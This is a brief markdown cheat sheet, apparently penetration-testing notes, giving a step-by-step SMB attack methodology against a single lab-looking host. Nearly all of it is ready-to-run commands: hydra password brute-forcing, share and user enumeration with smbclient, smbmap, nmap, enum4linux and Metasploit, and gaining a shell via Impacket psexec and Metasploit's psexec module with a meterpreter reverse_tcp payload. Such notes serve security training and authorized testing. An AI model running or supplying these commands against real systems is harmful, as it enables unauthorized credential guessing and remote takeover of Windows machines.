# Exploiting SMB Methodology

#### BRUTEFORCING CREDENTIALS OF KNOWN USERS:

```
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.5.28.241 smb
```

#### ENUMERATE AVAILABLE SHARES WITH OBTAINED CREDENTIALS:

```
smbclient -L 10.5.28.241 -U administrator
```

```
smbmap -u vagrant -p vagrant -H 10.5.28.241
```

#### ENUMERATING USERS ON THE TARGET:

```
nmap -p445 10.5.28.241 --script smb-enum-users --script-args smbusername='vagrant',smbpassword='vagrant' 
```

```
enum4linux -u vagrant -p vagrant -U 10.5.28.241
```

```
auxiliary/scanner/smb/smb_enumusers 
set RHOSTS 10.5.28.241
set SMBUSER vagrant
set SMBPASS vagrant
exploit
```

#### SPAWN A SHELL USING PSEXEC:

```
python3 psexec.py Administrator:vagrant@10.5.28.241
```

```
exploit/windows/smb/psexec  
set RHOSTS 10.5.28.241
set SMBUSER vagrant
set SMBPASS vagrant
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```